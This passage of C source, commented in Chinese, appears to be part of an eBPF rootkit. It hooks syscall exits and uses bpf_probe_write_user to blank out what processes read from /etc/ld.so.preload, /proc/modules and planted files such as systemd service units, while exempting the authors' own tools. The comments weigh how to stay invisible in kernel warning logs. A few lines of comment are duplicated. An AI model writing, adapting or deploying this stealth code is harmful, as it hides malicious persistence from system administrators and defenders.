        res = bpf_map_lookup_elem(&hide_names, kb);
        /* ★★ ISS-083 尾块回钳。原来是无条件写 AX_CHUNK(32) 字节，前提是
         *   "已返回 ≥ 32 字节"（read 分支的旧门槛保证了这点）。门槛放开后，
         *   `n` 可能只有 19：这时必须**只写已返回的那部分**，绝不能越过 ret
         *   写用户内存（调用方可能真的只给了 19 字节的缓冲）。
         * · `p < n` 的显式守卫先排掉 `n - p` 的无符号下溢；
         * · `w > AX_CHUNK` 的显式钳制是给 verifier 看的：helper 的 size 是
         *   ARG_CONST_SIZE，它得能证明 [raw, raw+w) 落在 raw[AX_CHUNK] 之内。
         * 两处都只**收紧**写回范围，不改变 `p + 32 <= n` 时的原有语义。 */
        /* ★★★ 9.5-①（**判定：不做**，2026-09-16）—— "把写回提出循环 / 就地累积"
         * 这条路在 verifier 上是**死的**，所以本处保持原样。硬证据（build_bpf.sh
         * 的 verifier 门禁实测）：
         *   · 原写法能过，**恰恰因为** bpf_probe_write_user 的 dst 是**用户指针**
         *     （ARG_ANYTHING）⇒ verifier **完全不跟踪**它 ⇒ 96 次迭代的循环头
         *     状态能合并。
         *   · 换成"把抹平后的 raw 就地累积进栈副本 tmp"（dst = 栈、偏移随 p 变）
         *     后，每个迭代**写到的栈槽位不同** ⇒ 栈状态指纹逐迭代不同 ⇒ 循环头
         *     状态永不合并 ⇒ `Processed 1000001 insn`
         *     （max_states_per_insn 48 / total_states 19587 / peak_states 2671）。
         *   · 收益侧也量过了：dmesg 那行告警由 bpf_get_probe_write_proto() 按
         *     **到达该 CALL 的状态数**打、且被 pr_warn_ratelimited 截顶（10 行
         *     / 5 秒）⇒ 10 行降到 ~2 行，在本机**已有的 1840 行**同类告警里
         *     **不可见**；而 taint 位与调用点本身都还在 ⇒ **检测面一个字节没变**。
         * ⇒ 真实对策是**减少加载次数**（redact 一次部署只加载一次），不是压行数。
         *   两条立此存照：**这里的 dst 必须是用户指针，换成栈就 1000001**。 */
        /* ★★ ISS-083 尾块回钳。原来是无条件写 AX_CHUNK(32) 字节，前提是
         *   "已返回 ≥ 32 字节"（read 分支的旧门槛保证了这点）。门槛放开后，
         *   `n` 可能只有 19：这时必须**只写已返回的那部分**，绝不能越过 ret
         *   写用户内存（调用方可能真的只给了 19 字节的缓冲）。
         * · `p < n` 的显式守卫先排掉 `n - p` 的无符号下溢；
         * · `w > AX_CHUNK` 的显式钳制是给 verifier 看的：helper 的 size 是
         *   ARG_CONST_SIZE，它得能证明 [raw, raw+w) 落在 raw[AX_CHUNK] 之内。
         * 两处都只**收紧**写回范围，不改变 `p + 32 <= n` 时的原有语义。 */
        if (res && (__u32)p < (__u32)n) {
            __u32 w = (__u32)n - (__u32)p;
            /* ★★ verifier **不认识 `p < n` 这个"关系"** —— 它只追每个标量各自
             * 的取值范围，不做两个标量之间的减法推理。所以上面那道守卫虽然
             * 逻辑上保证了 `w >= 1`，verifier 眼里 `n - p` 仍可能是 0。首轮
             * PROG_LOAD 就是这么拒的：
             *     R3 invalid zero-sized read: u64=[0,31]
             * umin 下不到 1 就过不了 helper 的 ARG_CONST_SIZE。
             * 下面这条 `w < 1` 在**运行期是死代码**（守卫 ⇒ w ≥ 1），它的唯一
             * 作用是把 umin 递给 verifier。★ 这一格 clang 看不见 —— 能编译
             * 不等于能加载，所以 build_bpf.sh 的 verifier 门禁一步都不能省。 */
            if (w > AX_CHUNK)
                w = AX_CHUNK;
            if (w < 1u)
                w = 1u;
            bpf_probe_write_user(dst + p, (__u8 *)raw, w);
        }
    }
}

SEC("tracepoint/raw_syscalls/sys_exit")
int ax_redact(struct trace_event_raw_sys_exit *args)
{
    struct pt_regs *regs;
    __u64 id, key;
    long nr;

    regs = ax_pt_regs();
    if (!regs)
        return 0;

    /* ctx 就是 vmlinux.h 里那个 id+ret 布局（raw_syscalls 版），不必再读 orig_ax。 */
    nr = args->id;
    id = bpf_get_current_pid_tgid();

    /* ── access：为 preload 的"探测 → 开"配对打旗标 ──
     * 只在 sys_exit 且探测成功时打：ld.so 探测失败就不会去开，旗标留着只会让
     * 本进程随后的某次 open 被误豁免。 */
    if (nr == AX_NR_ACCESS) {
        __u64 pathp = 0;
        char ap[32];
        __u8 probe = AX_KIND_PROBE;
        int asl;

        if (args->ret != 0)
            return 0;
        if (bpf_probe_read_kernel(&pathp, sizeof(pathp), &regs->AX_ACCESS_REG) != 0)
            return 0;
        __builtin_memset(ap, 0, sizeof(ap));
        asl = (int)bpf_probe_read_user_str(ap, sizeof(ap), (void *)pathp);
        if (asl < 0)
            return 0;
        /* ★ 触发面从"写死的 preload"扩到"hide_names 里任何基名"。
         * 类A 的产物同样需要"我们自己的工具能读到真值"这条通道 —— 否则撤离 / 幂等
         * 检查读到的是被抹平的假内容，表现为"成功地什么都没做"（ISS-076：
         * ld_preload_install 的 already-present 检查正是这么坏的）。
         * 判据仍是原来那两条：本进程刚探测过 + 这条 open 带 O_CLOEXEC。 */
        if (!ax_streq(ap, "/etc/ld.so.preload", 19) &&
            !ax_hidden_basename((const void *)pathp))
            return 0;
        key = ((__u64)(__u32)(id >> 32) << 32) | AX_PROBE_FD;
        bpf_map_update_elem(&redact_fds, &key, &probe, BPF_ANY);
        return 0;
    }

    /* ── openat(2) / open(2)：同一个动作的两种写法，**合并处理** ──
     * ★ ISS-054：x64 上这是两条不同的 syscall（open=2 / openat=257）。只挂
     * openat 时，任何直调 `open(2)` 的程序（静态链接 / musl / 直调 syscall /
     * **我们自己的 AxReadFileToBuffer**）读 preload **完全不被改写** —— 判据再准
     * 也没用，因为那条路径根本没进这个函数（p16 实测：同一次运行里规范路径被
     * 抹成空格，open(2) 读到全文）。arm64 没有 open(2)，AX_NR_OPEN 就等于
     * AX_NR_OPENAT，这一段在那边退化成原来的单分支。
     *
     * 参数位置不同：openat = path@si/flags@dx，open = path@di/flags@si。
     * 判据与缓冲**只有一份** —— 抽取成 inline 函数会让 clang 为两个调用点各
     * 分配一套栈槽，而本文件的栈本来就贴着 BPF 的 512 上限。 */
    if (nr == AX_NR_OPENAT || nr == AX_NR_OPEN) {
        __u64 pathp = 0, flags = 0;
        long fd = args->ret;
        char p[32];
        int slen;
        __u32 pn;
        __u8 kind;

        if (fd < 0)
            return 0;
        if (nr == AX_NR_OPENAT) {
            if (bpf_probe_read_kernel(&pathp, sizeof(pathp), &regs->si) != 0)
                return 0;
            if (bpf_probe_read_kernel(&flags, sizeof(flags), &regs->dx) != 0)
                return 0;
        } else {
            if (bpf_probe_read_kernel(&pathp, sizeof(pathp), &regs->AX_OPEN_PATH_REG) != 0)
                return 0;
            if (bpf_probe_read_kernel(&flags, sizeof(flags), &regs->AX_OPEN_FLAGS_REG) != 0)
                return 0;
        }
        /* 这颗缓冲**只用来量长度**（helper 返回含 NUL 的写入长度），不再参与比较
         * —— 比较改在用户地址上按变长偏移取（见 AX_TAIL_FN 头注）。所以不必先清零：
         * 残留字节读不到了（原注释担心的 ISS-043 同族问题随之消失）。 */
        slen = (int)bpf_probe_read_user_str(p, sizeof(p), (void *)pathp);
        if (slen < 0)
            return 0;
        pn = (__u32)(slen - 1);     /* helper 返回含 NUL 的长度 */

        /* ★★ 长度闸门**只能罩住 preload/modules，绝不能整体 return**。
         * 那两个判据靠 pn 定位（p[32] 量不到 >31 的路径，pn 不可信），
         * 可类A 的主力落点 /etc/systemd/system/<name>.service 正是 **33 字符**：
         * 早期版本在这里直接 return 0，于是 systemd 那一族**整个闸门
         * 都进不去**—— 设计稿里点名的一族，实测却"静默不生效"。
         * ax_hidden_basename() 自带 64 字节缓冲、自己量长度，不依赖 pn，
         * 所以它必须在长度闸门**外面**。 */
        kind = 0;
        if (pn <= 31u) {            /* 无符号比较同时排掉 slen==0 */
            if (ax_tail_preload((const void *)pathp, pn)) {
                if (ax_exempt(id, flags))
                    return 0;                              /* 不记表 = 不改写 */
                kind = AX_KIND_PRELOAD;
            } else if (ax_tail_modules((const void *)pathp, pn)) {
                kind = AX_KIND_MODULES; /* /proc/modules 没有豁免问题 */
            }
        }
        if (!kind) {
            /* ★ 类A 闸门：把"两个写死的名字"换成"整张 hide_names"（见其头注）。
             * 顺序仍然要紧：/etc/ld.so.preload（17 字符，过得了长度闸门）
             * 走上面那一支，仍是**选择性**抹平、保留邻行。 */
            if (!ax_hidden_basename((const void *)pathp))
                return 0;
            if (ax_exempt(id, flags))
                return 0;
            kind = AX_KIND_HIDE;
        }

        key = ((__u64)(id >> 32) << 32) | (__u32)fd;
        bpf_map_update_elem(&redact_fds, &key, &kind, BPF_ANY);
        return 0;
    }

    if (nr == AX_NR_READ) {
        __u64 fdv = 0, bufp = 0;
        __u8 *kindp;
        long ret = args->ret;
        long cov;
        int n;
        char tmp[AX_TMP];

        if (ret <= 0)
            return 0;
        if (bpf_probe_read_kernel(&fdv, sizeof(fdv), &regs->di) != 0)
            return 0;
        if (bpf_probe_read_kernel(&bufp, sizeof(bufp), &regs->si) != 0)
            return 0;

        key = ((__u64)(id >> 32) << 32) | (__u32)fdv;
        kindp = bpf_map_lookup_elem(&redact_fds, &key);
        if (!kindp || (*kindp != AX_KIND_PRELOAD && *kindp != AX_KIND_MODULES &&
                       *kindp != AX_KIND_HIDE))
            return 0;

        /* ★ 从**头部**窗口扫（原来写的是"从尾部"，见文件头 §扫描窗口）。
         * /proc/modules 是**新在前**（实测：insmod 后新模块在第 1 行），
         * 而登记进 hide_names 的正是"刚加载的那一个" ⇒ 它必然落在首窗里。
         * 原来的尾部窗口在 `cat`/`lsmod` 这类大缓冲读（ret≈4096）下永远扫不到
         * 它 —— 名字原样可读，而只有把读缓冲开得 ≤128 的读者才会"碰巧"被抹到。 */

        /* ── 类A：整块抹平（不查表、不读内容）──
         * 与下面的 PRELOAD/MODULES 的区别是**不关心文件里有什么**：整个文件都是我们
         * 造的产物，没有"哪些字该留"的问题，所以连读回来都不必 —— 直接盖空格。
         * 覆盖 [0, min(ret, AX_HIDE_CAP))：写回一律**常量** AX_CHUNK（helper 的 size
         * 必须是常量），尾块**回钳**到 cov-AX_CHUNK，保证每一笔都落在**已返回**的
         * 字节内 —— 绝不越界写用户内存（用户缓冲可能刚好只有 ret 字节）。
         * 已知边界：① 超过 AX_HIDE_CAP 的尾部原样残留；② 换行也被抹成空格 ⇒
         * `wc -l` 与真身不同（**st_size 不变**）。两者都写进文件头 §已知边界。 */
        if (*kindp == AX_KIND_HIDE) {
            cov = ret;
            if (cov > AX_HIDE_CAP)
                cov = AX_HIDE_CAP;
            if (cov < AX_CHUNK)
                return 0;
            __builtin_memset(tmp, ' ', AX_CHUNK);
            #pragma clang loop unroll(disable)
            for (int p = 0; p < AX_HIDE_CAP - AX_CHUNK; p += AX_CHUNK) {
                long w = p;

                if (w >= cov)
                    break;
                if (w + AX_CHUNK > cov)
                    w = cov - AX_CHUNK;              /* 尾块回钳 */
                bpf_probe_write_user((char *)bufp + w, tmp, AX_CHUNK);
            }
            return 0;
        }

        n = (int)ret;
        if (n > AX_SCAN)
            n = AX_SCAN;
        /* ★ ISS-083：门槛从 `n < AX_CHUNK` 放到 `n <= 0`。
         * 原来 n < 32 就**整个不扫**，而 `/etc/ld.so.preload` 最常见的形态
         * 恰恰是"只有我们写的一行短路径"（`/usr/lib/xxx.so\n` = 19 字节）
         * ⇒ 内容层对**最需要它的那个形态** 100% 不设防。p15 的台面因为写的
         * 内容比 32 长，一直没照到这一格（判据的输入形态覆盖不到定义域）。
         * 越界风险由 ax_scan 的尾块回钳接管：写回长度一律裁到"已返回的字节内"。 */
        if (n <= 0)
            return 0;

        /* 先整块清零：位置循环里会读 tmp[(p-1) & 255]（p==0 时落在尾部）与
         * tmp[p..p+32)，可能越过 n —— 不清零就是未初始化栈读，verifier 直接拒。 */
        __builtin_memset(tmp, 0, sizeof(tmp));
        /* 读失败（用户缓冲比 n 还短）就整体放弃 —— 宁可不改，也不能把没读到的
         * 字节写回去。 */
        if (bpf_probe_read_user(tmp, n, (void *)bufp) != 0)
            return 0;

        ax_scan(tmp, n, (__u8 *)bufp);
        return 0;
    }

    if (nr == AX_NR_CLOSE) {
        __u64 fdv = 0;

        if (bpf_probe_read_kernel(&fdv, sizeof(fdv), &regs->di) != 0)
            return 0;
        key = ((__u64)(id >> 32) << 32) | (__u32)fdv;
        bpf_map_delete_elem(&redact_fds, &key);
        return 0;
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
